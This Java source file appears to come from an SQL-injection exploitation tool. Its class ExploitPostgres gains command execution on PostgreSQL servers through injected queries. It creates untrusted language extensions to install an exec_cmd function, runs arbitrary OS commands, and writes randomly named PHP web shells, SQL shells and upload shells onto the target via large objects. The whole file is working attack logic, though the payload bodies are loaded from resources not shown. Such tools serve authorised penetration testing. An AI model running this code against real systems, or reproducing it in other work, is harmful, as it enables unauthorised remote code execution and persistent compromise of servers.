package com.jsql.model.accessible.vendor;

import com.jsql.model.InjectionModel;
import com.jsql.model.accessible.DataAccess;
import com.jsql.model.accessible.ExploitMode;
import com.jsql.model.accessible.ResourceAccess;
import com.jsql.model.accessible.vendor.postgres.ModelYamlPostgres;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.JSqlRuntimeException;
import com.jsql.model.injection.vendor.model.VendorYaml;
import com.jsql.util.LogLevelUtil;
import com.jsql.util.StringUtil;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.yaml.snakeyaml.Yaml;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URLEncoder;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.UUID;
import java.util.function.BinaryOperator;

public class ExploitPostgres {

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();
    private final InjectionModel injectionModel;
    private String nameExtension = StringUtils.EMPTY;
    private final ModelYamlPostgres modelYaml;

    public ExploitPostgres(InjectionModel injectionModel) {
        this.injectionModel = injectionModel;
        var yaml = new Yaml();
        this.modelYaml = yaml.loadAs(
            injectionModel.getMediatorVendor().getPostgres().instance().getModelYaml().getResource().getExploit(),
            ModelYamlPostgres.class
        );
    }

    public void createUdf(ExploitMode exploitMode) throws JSqlException {
        this.createUdf(exploitMode, null);
    }

    public void createUdf(ExploitMode exploitMode, String nameExtension) throws JSqlException {
        if (!Arrays.asList(ExploitMode.AUTO, ExploitMode.QUERY_BODY).contains(exploitMode)) {
            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit mode not implemented, using query body");
        }

        if (StringUtils.isEmpty(nameExtension)) {
            this.nameExtension = this.createExtension("plpython3u");
            if (StringUtils.isEmpty(this.nameExtension)) {
                this.nameExtension = this.createExtension("plpython2u");
            }
            if (StringUtils.isEmpty(this.nameExtension)) {
                this.nameExtension = this.createExtension("plpythonu");
            }
            if (StringUtils.isEmpty(this.nameExtension)) {
                this.nameExtension = this.createExtension("plperlu");
            }
            if (StringUtils.isEmpty(this.nameExtension)) {
                this.nameExtension = this.createExtension("plsh");
            }
            if (StringUtils.isEmpty(this.nameExtension)) {
                this.nameExtension = this.createExtension("sql");
            }
            if (StringUtils.isEmpty(this.nameExtension)) {
                LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: no extension found");
                return;
            }
        } else {
            this.nameExtension = this.createExtension(nameExtension);
        }

        this.injectionModel.injectWithoutIndex(this.modelYaml.getRce().getDropFunc(), ResourceAccess.ADD_FUNC);
        if (this.nameExtension.startsWith("plpython")) {
            this.injectionModel.injectWithoutIndex(
                String.format(this.modelYaml.getRce().getPlpython(),  this.nameExtension)
            , ResourceAccess.ADD_FUNC);
        } else if (this.nameExtension.startsWith("plperlu")) {
            this.injectionModel.injectWithoutIndex(this.modelYaml.getRce().getPlperlu(), ResourceAccess.ADD_FUNC);
        } else if (this.nameExtension.startsWith("plsh")) {
            this.injectionModel.injectWithoutIndex(this.modelYaml.getRce().getPlsh(), ResourceAccess.ADD_FUNC);
        } else if (this.nameExtension.startsWith("sql")) {
            this.injectionModel.injectWithoutIndex(this.modelYaml.getRce().getSql().getDropTable(), ResourceAccess.TBL_DROP);
            this.injectionModel.injectWithoutIndex(this.modelYaml.getRce().getSql().getCreateTable(), ResourceAccess.TBL_CREATE);
            this.injectionModel.injectWithoutIndex(this.modelYaml.getRce().getSql().getConfirm().getAddFunc(), ResourceAccess.ADD_FUNC);
            this.injectionModel.injectWithoutIndex(this.modelYaml.getRce().getSql().getRunCmd(), ResourceAccess.RUN_FUNC);
            var result = this.injectionModel.getResourceAccess().getResult(String.format(
                this.modelYaml.getRce().getSql().getResultCmd(),
                StringUtils.EMPTY
            ), ResourceAccess.BODY_CONFIRM);
            if (!"1337".equals(result)) {
                return;
            }
        }

        var functions = this.injectionModel.getResourceAccess().getResult(
            this.modelYaml.getRce().getSql().getConfirm().getFuncExists(),
            ResourceAccess.BODY_CONFIRM
        );
        if (!functions.contains("exec_cmd")) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: function not found");
            return;
        }

        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: function found for extension [{}]", this.nameExtension);

        var request = new Request();
        request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE_POSTGRES);
        request.setParameters(null, null);
        this.injectionModel.sendToViews(request);
    }

    private String createExtension(String nameExtension) throws JSqlException {
        LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Checking extension {}", nameExtension);
        this.injectionModel.injectWithoutIndex(String.format(
            this.modelYaml.getRce().getExtension().getCreate(),
            nameExtension
        ), "body#add-ext");
        String languages = this.injectionModel.getResourceAccess().getResult(
            this.modelYaml.getRce().getExtension().getLanguages(),
            "body#confirm-ext"
        );
        if (languages.contains(nameExtension)) {
            return nameExtension;
        }
        return StringUtils.EMPTY;
    }

    public String runRceCmd(String command, UUID uuidShell) {
        String result;
        try {
            if ("sql".equals(this.nameExtension)) {
                this.injectionModel.injectWithoutIndex(this.modelYaml.getRce().getSql().getClean(), "body#empty-tbl");
                this.injectionModel.injectWithoutIndex(String.format(
                    this.modelYaml.getRce().getSql().getRunFunc(),
                    command.replace(StringUtils.SPACE, "%20")
                ), ResourceAccess.ADD_FUNC);
                this.injectionModel.injectWithoutIndex(this.modelYaml.getRce().getSql().getRunCmd(), ResourceAccess.RCE_RUN_CMD);
                result = this.injectionModel.getResourceAccess().getResult(String.format(
                    this.modelYaml.getRce().getSql().getResultCmd(),
                    VendorYaml.TRAIL_SQL
                ), "body#result") +"\n";
            } else {
                result = this.injectionModel.getResourceAccess().getResult(
                    String.format(
                        this.modelYaml.getRce().getRunFunc(),
                        command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
                        VendorYaml.TRAIL_SQL
                    ),
                    ResourceAccess.RCE_RUN_CMD
                );
            }
        } catch (JSqlException e) {
            result = String.format(ResourceAccess.TEMPLATE_ERROR, e.getMessage(), command);
        }
        var request = new Request();
        request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);
        request.setParameters(uuidShell, result.trim() +"\n");  // missing newline on some extensions
        this.injectionModel.sendToViews(request);
        return result;
    }

    public void createWeb(String pathExploit, String urlExploit) {
        String bodyExploit = StringUtil.base64Decode(
                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperty(ResourceAccess.EXPLOIT_DOT_WEB)
            )
            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);

        var loid = this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
            this.modelYaml.getFile().getWrite().getLargeObject().getFromText(),
            bodyExploit.replace("'", "\"")
        ), ResourceAccess.ADD_LOID);
        if (StringUtils.isEmpty(loid)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.LOID_NOT_FOUND);
            return;
        }
        var nameExploit = RandomStringUtils.secure().nextAlphabetic(8) +".php";
        this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
            this.modelYaml.getFile().getWrite().getLargeObject().getToFile(),
            loid,
            pathExploit + nameExploit
        ), ResourceAccess.WRITE_LOID);

        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
            String result = this.injectionModel.getResourceAccess().callCommand(
                urlSuccess +"?c="+ ResourceAccess.WEB_CONFIRM_CMD
            );
            if (!result.contains("iamin133707331")) {
                LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit body not found");
                return StringUtils.EMPTY;
            }
            var request = new Request();
            request.setMessage(Interaction.ADD_TAB_EXPLOIT_WEB);
            request.setParameters(urlSuccess);
            this.injectionModel.sendToViews(request);
            return urlSuccess;
        };

        this.injectionModel.getResourceAccess().checkUrls(urlExploit, nameExploit, biFuncGetRequest);
    }

    public String createSql(String pathExploit, String urlExploit, String username, String password) {
        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
            var resultQuery = this.injectionModel.getResourceAccess().runSqlShell(
                ResourceAccess.SQL_CONFIRM_CMD,
                null,
                urlSuccess,
                username,
                password,
                false
            );
            if (resultQuery != null && resultQuery.contains(ResourceAccess.SQL_CONFIRM_RESULT)) {
                var request = new Request();
                request.setMessage(Interaction.ADD_TAB_EXPLOIT_SQL);
                request.setParameters(urlSuccess, username, password);
                this.injectionModel.sendToViews(request);
                return urlSuccess;
            }
            return StringUtils.EMPTY;
        };

        String bodyExploit = StringUtil.base64Decode(
                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperty("exploit.sql.pdo.pgsql")
            )
            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);

        var loid = this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
            this.modelYaml.getFile().getWrite().getLargeObject().getFromText(),
            bodyExploit.replace("'", "\"")
        ), ResourceAccess.ADD_LOID);
        if (StringUtils.isEmpty(loid)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.LOID_NOT_FOUND);
            return StringUtils.EMPTY;
        }
        var nameExploit = RandomStringUtils.secure().nextAlphabetic(8) +".php";
        this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
            this.modelYaml.getFile().getWrite().getLargeObject().getToFile(),
            loid,
            pathExploit + nameExploit
        ), ResourceAccess.WRITE_LOID);

        return this.injectionModel.getResourceAccess().checkUrls(urlExploit, nameExploit, biFuncGetRequest);
    }

    public void createUpload(String pathExploit, String urlExploit, File fileToUpload) {
        String bodyExploit = StringUtil.base64Decode(
                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperty(ResourceAccess.EXPLOIT_DOT_UPL)
            )
            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);

        var loid = this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
            this.modelYaml.getFile().getWrite().getLargeObject().getFromText(),
            bodyExploit.replace("'", "\"")
        ), ResourceAccess.ADD_LOID);
        if (StringUtils.isEmpty(loid)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.LOID_NOT_FOUND);
            return;
        }
        var nameExploit = RandomStringUtils.secure().nextAlphabetic(8) +".php";
        this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
            this.modelYaml.getFile().getWrite().getLargeObject().getToFile(),
            loid,
            pathExploit + nameExploit
        ), ResourceAccess.WRITE_LOID);

        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
            try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
                HttpResponse<String> result = this.injectionModel.getResourceAccess().upload(fileToUpload, urlSuccess, streamToUpload);
                if (result.body().contains(DataAccess.LEAD +"y")) {
                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, ResourceAccess.UPLOAD_SUCCESSFUL, pathExploit, fileToUpload.getName());
                } else {
                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.UPLOAD_FAILURE, pathExploit, fileToUpload.getName());
                }
            } catch (InterruptedException e) {
                LOGGER.log(LogLevelUtil.IGNORE, e, e);
                Thread.currentThread().interrupt();
            } catch (IOException | JSqlException e) {
                throw new JSqlRuntimeException(e);
            }
            return urlSuccess;
        };

        this.injectionModel.getResourceAccess().checkUrls(urlExploit, nameExploit, biFuncGetRequest);
    }

    public ModelYamlPostgres getModelYaml() {
        return this.modelYaml;
    }
}
